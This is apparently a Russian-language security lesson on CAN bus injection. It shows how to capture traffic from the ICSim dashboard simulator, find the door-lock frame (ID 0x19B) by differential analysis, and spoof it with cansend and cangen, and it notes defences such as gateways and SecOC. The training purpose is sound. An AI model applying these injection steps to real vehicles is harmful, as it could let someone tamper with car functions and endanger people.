## Вопрос, с которого всё начинается

Ты уже умеешь слушать CAN-шину: в уроке про шину мы снимали трафик через `candump`, а в уроке про диагностику разбирали UDS. Но слушать — это только половина дела. Физический доступ к шине даёт не только чтение: каждый узел может отправить кадр с любым идентификатором. Значит, можно притвориться дверью, датчиком скорости, тормозом — и заставить машину сделать то, что нужно тебе.

Вопрос урока: **как, имея только записанный трафик, найти нужный кадр и подделать его?**

## Наш пример: виртуальная приборная панель

Чтобы не рисковать настоящей машиной, возьмём **ICSim** (Instrument Cluster Simulator) — учебный стенд, который рисует приборную панель и слушает виртуальную шину. Это программа с открытым кодом: на панели едут стрелки, мигают поворотники, открываются двери. Рядом запускается второе окно, `controls`, с кнопками для этих функций.

Сначала поднимем виртуальную шину. Настоящий CAN-интерфейс требует железа (про адаптеры — ниже), но в Linux есть **vcan** — программная шина, которая ведёт себя как настоящая, только живёт в памяти. Для тренировки этого достаточно:

```
$ sudo modprobe vcan
$ sudo ip link add dev vcan0 type vcan
$ sudo ip link set up vcan0
$ ip -details link show vcan0
3: vcan0: <NOARP,UP,LOWER_UP> mtu 72 qdisc noqueue state UNKNOWN
    link/can  promiscuity 0
    can state ERROR-ACTIVE
```

Что мы увидели: интерфейс `vcan0` создан и поднят (`UP`), состояние `ERROR-ACTIVE` — узел здоров и может передавать. `modprobe vcan` подгружает модуль ядра, `ip link` создаёт и включает интерфейс. Теперь запускаем стенд (два окна, каждое — в своём фоне):

```
$ ./icsim vcan0 &
$ ./controls vcan0 &
```

## Шаг 1: снимаем «спокойный» трафик

Прежде чем что-то подделывать, надо понять, что вообще происходит на шине. Слушаем 10 секунд и пишем лог:

```
$ timeout 10 candump -L vcan0 > idle.log
$ wc -l idle.log
1204 idle.log
```

`candump` печатает каждый увиденный кадр, `timeout 10` останавливает его через 10 секунд, `-L` включает «log-формат» — его потом можно проиграть назад через `canplayer`. Одна строка лога выглядит так:

```
(1697113200.123456) vcan0 19B#0000000000000000
```

Разберём её: в скобках — время (секунды от эпохи), дальше имя интерфейса, потом `19B` — идентификатор кадра в hex, а всё после `#` — байты данных. Именно эти два поля — ID и данные — мы и будем подделывать. Никакого «от кого» в кадре нет: идентификатор говорит только о смысле сообщения, а не о его отправителе.

## Шаг 2: какие ID есть и как часто они шлются

Тысяча двести строк — это много для глаз. Посчитаем, какие идентификаторы встречаются и как часто:

```
$ awk '{print $3}' idle.log | cut -d'#' -f1 | sort | uniq -c | sort -rn | head
    300 0x100
    300 0x101
    150 0x200
     50 0x19B
```

`awk '{print $3}'` берёт третье поле строки (сам кадр), `cut -d'#' -f1` отрезает данные, оставляя только ID, `uniq -c` считает повторы, а `sort -rn` сортирует по убыванию счётчика. Читаем результат: `0x100` и `0x101` идут по 300 раз за 10 секунд — это 30 Гц, значит, их кто-то передаёт постоянно (обычно датчики). А `0x19B` — всего 50 раз: это **событийный** сигнал, он появляется не всегда, а по какому-то действию. Именно на такие редкие ID стоит смотреть в первую очередь.

## Шаг 3: находим, какой ID отвечает за дверь

Теперь применим **дифференциальный анализ**: нажмём в окне `controls` кнопку «открыть дверь» и посмотрим, что изменилось. Удобно слушать только подозрительный ID:

```
$ candump vcan0 | grep 19B
  vcan0  19B   [8]  00 00 00 00 00 00 00 01
  vcan0  19B   [8]  00 00 00 00 00 00 00 00
```

`[8]` — это длина данных (в кадре 8 байт). Видим, что меняется **последний байт**: `01`, когда дверь открыта, и `00`, когда закрыта. Сигнал найден: идентификатор `0x19B`, восьмой байт. Логика проста: жмём функцию — смотрим, какой байт «дёрнулся».

## Шаг 4: подделываем кадр

Теперь откроем дверь, вообще не трогая `controls` — просто отправив кадр:

```
$ cansend vcan0 19B#0000000000000001
$ cansend vcan0 19B#0000000000000000
```

На панели дверь открылась и закрылась. `cansend` шлёт ровно один кадр, синтаксис — `ID#DATA`. Мы научились управлять функцией по найденному ID и значению: это и есть инъекция.

## Шаг 5: когда сигнал не находится глазами

Быстрые сигналы (скорость, обороты) меняются десятки раз в секунду — следить за байтами вручную невозможно. Здесь помогает `cansniffer`: он подсвечивает именно те байты, которые меняются, и по этой «ряби» видно, где счётчик, где контрольная сумма, а где само значение:

```
$ cansniffer -c vcan0
```

Ещё один приём — проверить реакцию на поток кадров генератором `cangen`:

```
$ cangen vcan0 -g 10 -I 19B -L 8 -D 0000000000000001 -n 20
```

`-g 10` — интервал 10 мс, `-I 19B` — идентификатор, `-L 8` — длина данных, `-D ...` — сами данные, `-n 20` — всего 20 кадров. Если на стенде дверь будет открываться, значит, поток мы собрали верно.

## Если не сработало

- **Кадр уходит, но реакции нет.** Скорее всего, дело в **арбитраже**. Если два узла передают одновременно, побеждает кадр с меньшим числовым ID (нули «перебивают» единицы). Поэтому инъекция с высоким ID может проигрывать легитимному отправителю.
- **Есть счётчик и контрольная сумма.** Многие реальные сигналы содержат checksum и счётчик свежести. Подделка без их пересчёта приёмником просто игнорируется. На стенде ICSim их нет, на настоящем автомобиле — почти всегда есть.
- **Через OBD-II видно не всё.** Современные авто ставят **gateway** — шлюз, который фильтрует сообщения между диагностическим портом и силовыми шинами. Инъекция в силовую шину требует физического доступа именно к ней.
- **SecOC.** Протокол **SecOC** (Secure Onboard Communication) добавляет к кадру MAC и счётчик, поэтому инъекция без правильного ключа отвергается. Реверс ключа — отдельная задача (см. урок про извлечение прошивки).

## Что мы теперь знаем

1. Любой узел CAN может отправить кадр с любым ID — в этом суть инъекции.
2. Сначала снимают «спокойный» трафик и находят событийные (редкие) ID.
3. Дифференциальный анализ: нажми функцию — посмотри, какой байт изменился.
4. `cansend ID#DATA` шлёт кадр, `cangen` — поток, `cansniffer` — подсвечивает изменения.
5. Защита — gateway, контрольные суммы/счётчики, SecOC; на них инъекция «в лоб» не работает.

## Куда дальше

Мы научились управлять одной функцией по найденному ID.
